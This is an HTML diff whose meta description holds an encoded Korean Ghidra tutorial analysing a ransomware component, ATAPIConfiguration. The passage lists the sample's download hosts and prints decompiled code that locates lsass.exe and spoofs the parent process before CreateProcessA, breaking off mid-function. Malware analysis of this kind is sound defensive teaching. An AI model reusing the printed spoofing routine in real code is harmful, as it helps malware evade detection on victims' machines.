@@ -13,7 +13,465 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;p&gt;&lt;strong&gt;&amp;#xB2E4;&amp;#xB978; &amp;#xD30C;&amp;#xD2B8; &amp;#xBCF4;&amp;#xB7EC;&amp;#xAC00;&amp;#xAE30;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 1 - Overview&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 2 - Data, Functions, Scripts&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 3 - tips for IDA User (Here!)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/&#34;&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 4 - Malware Analysis (1)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Re:versing&amp;#xC73C;&amp;#xB85C; &amp;#xC2DC;&amp;#xC791;&amp;#xD558;&amp;#xB294; ghidra &amp;#xC0DD;&amp;#xD65C; Part 5 - Malware Analysis (2) (Here!)&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;. idioth&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5EC;&amp;#xB7EC;&amp;#xBAA8;&amp;#xB85C; &amp;#xC77C;&amp;#xC815;&amp;#xC774; &amp;#xB51C;&amp;#xB808;&amp;#xC774;&amp;#xAC00; &amp;#xB418;&amp;#xC5B4;&amp;#xC11C; &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xB97C; &amp;#xC791;&amp;#xC131;&amp;#xD558;&amp;#xB294;&amp;#xB370; &amp;#xAF64; &amp;#xC624;&amp;#xB79C; &amp;#xC2DC;&amp;#xAC04;&amp;#xC774; &amp;#xAC78;&amp;#xB838;&amp;#xB124;&amp;#xC694;. &amp;#xC774;&amp;#xBC88; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; ataware &amp;#xB79C;&amp;#xC12C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC758; ATAPIConfiguration &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xB300;&amp;#xD574; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xC608;&amp;#xC815;&amp;#xC774;&amp;#xC5D0;&amp;#xC694;. &amp;#xC138; &amp;#xAC1C;&amp;#xC758; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC; (ATAPIinit, ATAPIConfiguration, ATAPIUpdtr)&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD55C;&amp;#xB2E4;&amp;#xACE0; &amp;#xD558;&amp;#xC600;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; &amp;#xAE30;&amp;#xB2A5; &amp;#xC790;&amp;#xCCB4;&amp;#xAC00; &amp;#xD06C;&amp;#xAC8C; &amp;#xB2E4;&amp;#xB974;&amp;#xC9C0; &amp;#xC54A;&amp;#xACE0; &amp;#xC545;&amp;#xC131;&amp;#xCF54;&amp;#xB4DC; &amp;#xBD84;&amp;#xC11D;&amp;#xC5D0; &amp;#xCE58;&amp;#xC911;&amp;#xB418;&amp;#xB294; &amp;#xAC83; &amp;#xAC19;&amp;#xC544; &amp;#xC774;&amp;#xBC88; &amp;#xD30C;&amp;#xD2B8;&amp;#xB97C; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9;&amp;#xC73C;&amp;#xB85C; ghidra &amp;#xC2DC;&amp;#xB9AC;&amp;#xC988;&amp;#xB294; &amp;#xC644;&amp;#xB8CC;&amp;#xB420; &amp;#xC608;&amp;#xC815;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;h1 id=&#34;&amp;#xC11C;&amp;#xB860;&#34;&gt;&lt;a href=&#34;#&amp;#xC11C;&amp;#xB860;&#34; class=&#34;headerlink&#34; title=&#34;&amp;#xC11C;&amp;#xB860;&#34;&gt;&lt;/a&gt;&amp;#xC11C;&amp;#xB860;&lt;/h1&gt;&lt;p&gt;&amp;#xC800;&amp;#xBC88; &amp;#xAC8C;&amp;#xC2DC;&amp;#xAE00;&amp;#xC5D0;&amp;#xC11C; ATAPIinit &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xAC00; &lt;code&gt;dropboxusercontent&lt;/code&gt; &amp;#xB9C1;&amp;#xD06C;&amp;#xC5D0; &amp;#xC811;&amp;#xC18D;&amp;#xD558;&amp;#xC5EC; ATAPIConfiguration&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD655;&amp;#xC778;&amp;#xD588;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xB9C1;&amp;#xD06C;&amp;#xB294; &amp;#xD604;&amp;#xC7AC; &amp;#xBE44;&amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC73C;&amp;#xBBC0;&amp;#xB85C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xB294; &lt;a href=&#34;https://www.notion.so/3a72818cfd7e4c05aa3ca52a894ae0d6&#34;&gt;app.any.run&lt;/a&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xAD6C;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;Detect It Easy&amp;#xB85C; &amp;#xD655;&amp;#xC778;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC; &amp;#xC800;&amp;#xBC88;&amp;#xACFC; &amp;#xB3D9;&amp;#xC77C;&amp;#xD558;&amp;#xAC8C; mingw gcc&amp;#xB85C; &amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xC774; &amp;#xB41C; &amp;#xD30C;&amp;#xC77C;&amp;#xC784;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled%201.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xBC88;&amp;#xC5D0;&amp;#xB294; &amp;#xC800;&amp;#xBC88;&amp;#xACFC; &amp;#xB2EC;&amp;#xB9AC; &amp;#xD06C;&amp;#xAC8C; &amp;#xB208;&amp;#xC5D0; &amp;#xB744;&amp;#xB294; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC740; &amp;#xC5C6;&amp;#xC9C0;&amp;#xB9CC;, &lt;code&gt;wininet.dll&lt;/code&gt;, &lt;code&gt;berylia.net&lt;/code&gt;, &lt;code&gt;Wlsass.exe&lt;/code&gt; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC744; &amp;#xBCF4;&amp;#xACE0; &amp;#xC720;&amp;#xCD94;&amp;#xD574;&amp;#xBCFC; &amp;#xB54C;, &amp;#xD574;&amp;#xB2F9; &amp;#xB9C1;&amp;#xD06C;&amp;#xC5D0; network &amp;#xC811;&amp;#xC18D;&amp;#xC744; &amp;#xD558;&amp;#xC5EC; &lt;code&gt;Wlsass.exe&lt;/code&gt; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xB2E4;&amp;#xC6B4;&amp;#xB85C;&amp;#xB4DC;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; &amp;#xCD94;&amp;#xC815;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xB124;&amp;#xC694;.&lt;/p&gt;
+&lt;h1 id=&#34;Ghidra&amp;#xB97C;-&amp;#xD1B5;&amp;#xD55C;-&amp;#xAE30;&amp;#xCD08;-&amp;#xC815;&amp;#xC801;-&amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;a href=&#34;#Ghidra&amp;#xB97C;-&amp;#xD1B5;&amp;#xD55C;-&amp;#xAE30;&amp;#xCD08;-&amp;#xC815;&amp;#xC801;-&amp;#xBD84;&amp;#xC11D;&#34; class=&#34;headerlink&#34; title=&#34;Ghidra&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; &amp;#xAE30;&amp;#xCD08; &amp;#xC815;&amp;#xC801; &amp;#xBD84;&amp;#xC11D;&#34;&gt;&lt;/a&gt;Ghidra&amp;#xB97C; &amp;#xD1B5;&amp;#xD55C; &amp;#xAE30;&amp;#xCD08; &amp;#xC815;&amp;#xC801; &amp;#xBD84;&amp;#xC11D;&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2021/07/11/idioth/ghidra_part5/Untitled%202.png&#34; alt&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#xBC8C;&amp;#xC368; &amp;#xB9C8;&amp;#xC9C0;&amp;#xB9C9; &amp;#xD30C;&amp;#xD2B8;&amp;#xAE4C;&amp;#xC9C0; &amp;#xB3C4;&amp;#xB2EC;&amp;#xD588;&amp;#xC73C;&amp;#xB2C8; &amp;#xC774;&amp;#xC81C; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC; &amp;#xC815;&amp;#xB3C4;&amp;#xB294; &amp;#xAC00;&amp;#xBFD0;&amp;#xD558;&amp;#xAC8C; &amp;#xC5F4;&amp;#xACE0; analyze&amp;#xB97C; &amp;#xD558;&amp;#xC2E4; &amp;#xC218; &amp;#xC788;&amp;#xACA0;&amp;#xC8E0;? ATAPIConfiguration&amp;#xC744; &amp;#xCD94;&amp;#xAC00;&amp;#xD574;&amp;#xC900; &amp;#xD6C4; analyze&amp;#xAE4C;&amp;#xC9C0; &amp;#xD574;&amp;#xC90D;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;undefined4 &lt;span class=&#34;hljs-title&#34;&gt;FUN_00401cb7&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; bVar1;
+  HMODULE pHVar2;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar3;
+  undefined3 extraout_var;
+  undefined4 uVar4;
+  HANDLE hHeap;
+  undefined4 local_2c4 [&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
+  undefined4 local_2bc;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;wchar_t&lt;/span&gt; awStack672 [&lt;span class=&#34;hljs-number&#34;&gt;260&lt;/span&gt;];
+  SIZE_T local_98;
+  undefined local_94 [&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;];
+  undefined4 local_84 [&lt;span class=&#34;hljs-number&#34;&gt;17&lt;/span&gt;];
+  LPVOID local_40;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_3c [&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
+  FARPROC local_34;
+  FARPROC local_30;
+  FARPROC local_2c;
+  FARPROC local_28;
+  DWORD local_24;
+  FARPROC local_20;
+  FARPROC local_1c;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; local_18;
+  FARPROC local_14;
+  undefined4 local_10;
+  
+  local_3c[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+  pHVar2 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+  local_14 = GetProcAddress(pHVar2,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateToolhelp32Snapshot&amp;quot;&lt;/span&gt;);
+  local_18 = (*local_14)(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  local_2c4[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x22c&lt;/span&gt;;
+  pHVar2 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+  local_1c = GetProcAddress(pHVar2,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Process32FirstW&amp;quot;&lt;/span&gt;);
+  pHVar2 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+  local_20 = GetProcAddress(pHVar2,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Process32NextW&amp;quot;&lt;/span&gt;);
+  iVar3 = (*local_1c)(local_18,local_2c4);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (iVar3 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    local_24 = GetLastError();
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+    iVar3 = wcscmp(awStack672,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;lsass.exe&amp;quot;&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (iVar3 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+      local_10 = local_2bc;
+    }
+    iVar3 = (*local_20)(local_18,local_2c4);
+  } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (iVar3 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  bVar1 = FUN_00401b91();
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (CONCAT31(extraout_var,bVar1) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+    pHVar2 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+    local_28 = GetProcAddress(pHVar2,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;OpenProcess&amp;quot;&lt;/span&gt;);
+    local_3c[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = (*local_28)(&lt;span class=&#34;hljs-number&#34;&gt;0x1f0fff&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,local_10);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (local_3c[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+      uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+      &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(local_84,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;);
+      pHVar2 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+      local_2c = GetProcAddress(pHVar2,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InitializeProcThreadAttributeList&amp;quot;&lt;/span&gt;);
+      pHVar2 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+      local_30 = GetProcAddress(pHVar2,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;UpdateProcThreadAttribute&amp;quot;&lt;/span&gt;);
+      (*local_2c)(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&amp;amp;local_98);
+      hHeap = GetProcessHeap();
+      local_40 = HeapAlloc(hHeap,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,local_98);
+      (*local_2c)(local_40,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&amp;amp;local_98);
+      (*local_30)(local_40,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x20000&lt;/span&gt;,local_3c,&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+      local_84[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;;
+      pHVar2 = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+      local_34 = GetProcAddress(pHVar2,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateProcessA&amp;quot;&lt;/span&gt;);
+      FUN_00401570();
+      iVar3 = (*local_34)(DAT_00416028,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x80010&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,local_84,local_94);
+      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (iVar3 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+        uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+      }
+      &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+        uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;;
+      }
+    }
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; uVar4;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xBC88; &amp;#xBC14;&amp;#xC774;&amp;#xB108;&amp;#xB9AC;&amp;#xC5D0;&amp;#xC11C; &amp;#xC911;&amp;#xC810;&amp;#xC801;&amp;#xC73C;&amp;#xB85C; &amp;#xBD84;&amp;#xC11D;&amp;#xD560; &amp;#xBD80;&amp;#xBD84;&amp;#xC740; &lt;code&gt;FUN_00401cb7&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC5ED;&amp;#xC2DC;&amp;#x2026; &amp;#xCC98;&amp;#xC74C; &amp;#xC5F4;&amp;#xC5C8;&amp;#xC744; &amp;#xB54C;&amp;#xB294; &amp;#xBCF4;&amp;#xAE30;&amp;#xAC00; &amp;#xC0C1;&amp;#xB2F9;&amp;#xD788; &amp;#xBD88;&amp;#xD3B8;&amp;#xD558;&amp;#xB124;&amp;#xC694;. &amp;#xC774; &amp;#xBCC0;&amp;#xC218;&amp;#xAC00; &amp;#xC5B4;&amp;#xB5A4; &amp;#xAC74;&amp;#xC9C0;&amp;#xB3C4; &amp;#xBAA8;&amp;#xB974;&amp;#xACA0;&amp;#xACE0;~ &amp;#xC800;&amp;#xBC88; &amp;#xC2DC;&amp;#xAC04;&amp;#xACFC; &amp;#xAC19;&amp;#xC774; &amp;#xBCF4;&amp;#xAE30; &amp;#xD3B8;&amp;#xD558;&amp;#xAC8C; &amp;#xC815;&amp;#xB9AC;&amp;#xD574;&amp;#xBD05;&amp;#xC2DC;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs cpp&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;undefined4 &lt;span class=&#34;hljs-title&#34;&gt;FUN_00401cb7&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
+  &lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; bVar1;
+  HMODULE hModule;
+  WINBOOL WVar2;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; iVar3;
+  undefined3 extraout_var;
+  undefined4 uVar4;
+  HANDLE hHeap;
+  PROCESSENTRY32W lppe;
+  SIZE_T local_98;
+  _PROCESS_INFORMATION local_94;
+  _STARTUPINFOA local_84;
+  LPPROC_THREAD_ATTRIBUTE_LIST local_40;
+  HANDLE proc_handle [&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;];
+  CreateProcessA *CreateProcessA_addr;
+  UpdateProcThreadAttribute *UpdateProcThreadAttribute_addr;
+  InitializeProcThreadAttributeList *InitializeProcThreadAttributeList_addr;
+  OpenProcess *OpenProcess_addr;
+  DWORD local_24;
+  Process32NextW *Process32NextW_addr;
+  Process32FirstW *Process32FirstW_addr;
+  HANDLE hSnapshot;
+  CreateToolhelp32Snapshot *CreateToolhelp32Snapshot_addr;
+  DWORD pid;
+  
+  proc_handle[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;;
+  hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+  CreateToolhelp32Snapshot_addr =
+       (CreateToolhelp32Snapshot *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;CreateToolhelp32Snapshot&amp;quot;&lt;/span&gt;);
+  hSnapshot = (*CreateToolhelp32Snapshot_addr)(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  lppe.dwSize = &lt;span class=&#34;hljs-number&#34;&gt;0x22c&lt;/span&gt;;
+  hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+  Process32FirstW_addr = (Process32FirstW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Process32FirstW&amp;quot;&lt;/span&gt;);
+  hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+  Process32NextW_addr = (Process32NextW *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Process32NextW&amp;quot;&lt;/span&gt;);
+  WVar2 = (*Process32FirstW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;amp;lppe);
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (WVar2 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    local_24 = GetLastError();
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;do&lt;/span&gt; {
+    iVar3 = wcscmp(lppe.szExeFile,&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;lsass.exe&amp;quot;&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (iVar3 == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+      pid = lppe.th32ProcessID;
+    }
+    WVar2 = (*Process32NextW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;amp;lppe);
+  } &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; (WVar2 != &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;);
+  bVar1 = FUN_00401b91();
+  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (CONCAT31(extraout_var,bVar1) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) {
+    uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+  }
+  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+    hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+    OpenProcess_addr = (OpenProcess *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;OpenProcess&amp;quot;&lt;/span&gt;);
+    proc_handle[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] = (*OpenProcess_addr)(&lt;span class=&#34;hljs-number&#34;&gt;0x1f0fff&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,pid);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (proc_handle[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;] == (HANDLE)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;) {
+      uVar4 = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+    }
+    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; {
+      &lt;span class=&#34;hljs-built_in&#34;&gt;memset&lt;/span&gt;(&amp;amp;local_84,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0x48&lt;/span&gt;);
+      hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+      InitializeProcThreadAttributeList_addr =
+           (InitializeProcThreadAttributeList *)
+           GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;InitializeProcThreadAttributeList&amp;quot;&lt;/span&gt;);
+      hModule = GetModuleHandleW(&lt;span class=&#34;hljs-string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;);
+      UpdateProcThreadAttribute_addr =
+           (UpdateProcThreadAttribute *)GetProcAddress(hModule,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;UpdateProcThreadAttribute&amp;quot;&lt;/span&gt;);
+      (*InitializeProcThreadAttributeList_addr)((LPPROC_THREAD_ATTRIBUTE_LIST)&lt;span class=&#34;hljs-number&#34;&gt;0x0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&amp;amp;local_98);
+      hHeap = GetProcessHeap();
+      local_40 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,local_98);
+      (*InitializeProcThreadAttributeList_addr)(local_40,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&amp;amp;local_98);
